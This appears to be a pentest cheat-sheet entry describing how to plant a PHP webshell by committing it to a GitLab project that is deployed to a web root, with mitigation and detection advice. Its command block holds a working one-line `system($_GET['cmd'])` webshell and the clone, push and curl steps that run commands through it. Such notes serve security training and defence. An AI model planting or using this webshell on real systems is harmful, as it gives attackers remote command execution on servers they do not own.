---
topic: GitLab — webshell in a deployed project
tags: [web, gitlab, webshell, deployment, git]
---

# GitLab — webshell in a deployed project

**English** | [🌐 Español](gitlab-webshell.md)

## Concept

GitLab does not execute PHP by itself, but a project may be cloned into a website document root. If an authenticated user can create or modify files and the deployment publishes them, a committed `.php` becomes a webshell. The weakness is the trust between the repository and the web server.

## When it applies

- GitLab allows registration or valid credentials have been obtained.
- The server has projects cloned into `/var/www` or deploys them automatically.
- The site stack interprets PHP, Python or CGI from that path.

## Procedure

1. Enumerate projects, branches and pipelines visible to the account.
2. Clone the project and check whether its path matches the document root.
3. Add an interpreted file, commit and push.
4. Request the file over HTTP and run commands.

## Commands

```bash
git clone http://<USER>:<PASS>@<HOST>/root/profile.git
cd profile
printf "%s\n" "<?php system($_GET["cmd"]); ?>" > shell.php
git add shell.php && git commit -m shell && git push
curl "http://<HOST>/profile/shell.php?cmd=id"
```

## Variants

- Modify an existing template so the webshell lands on an already published route.
- Use a CI pipeline that deploys the branch to production.
- Abuse a public project and a poorly isolated runner.

## Limitations

- GitLab stores code but does not execute it: a deployment or runner is required.
- The web server may only serve specific branches.
- Account permissions may prevent pushing to the deployed branch.

## Mitigation

- Separate GitLab from the server that publishes code.
- Require review, signatures and least privilege on deployed branches.
- Serve only built artifacts and block executable extensions.

## Detection

- Commits adding `.php`, `.jsp` or `.aspx` to a deployed project.
- HTTP requests to newly created files in the document root.
- Pipelines publishing changes without review.

## References

- [0xdf — Bitlab](https://0xdf.gitlab.io/2020/01/11/htb-bitlab.html)
- [GitLab Docs — Projects](https://docs.gitlab.com/ee/user/project/)
- [CWE-434 — Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
